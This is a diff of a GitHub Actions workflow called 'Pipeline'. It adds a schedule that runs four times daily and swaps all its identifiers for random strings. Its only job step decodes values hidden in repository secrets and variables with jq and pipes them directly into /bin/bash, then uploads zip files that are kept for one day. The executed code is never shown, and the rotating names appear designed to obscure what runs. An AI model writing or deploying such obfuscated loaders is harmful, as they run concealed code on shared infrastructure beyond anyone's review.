@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '8 1,7,13,19 * * *'
 env:
   CI: true
 concurrency:
@@ -14,17 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          v876: ${{ secrets.v876 }}
+          wroqx5: ${{ secrets.wroqx5 }}
         run: |
-          printf '%s' "$v876" | jq -r .kvf25630 | /bin/bash
-          echo $n6 | jq -r .vkd40 | /bin/bash
-          echo $m29 | jq -r .vefl78235 | /bin/bash
-          echo $zllrd825 | jq -r .mtp320 | /bin/bash
-          echo $twx98036 | jq -r .uh78142 | /bin/bash
+          printf '%s' "$wroqx5" | jq -r .ca32 | /bin/bash
+          echo $qan93 | jq -r .c0977 | /bin/bash
+          printf '%s' "$vi001" | jq -r .ig9027 | /bin/bash
+          printf '%s' "$x513" | jq -r .rqtcd96639 | /bin/bash
+          echo $tnue9287 | jq -r .o2 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: AYoxbsYv
+          name: r82Kk4w9
           path: "*.zip"
           retention-days: 1
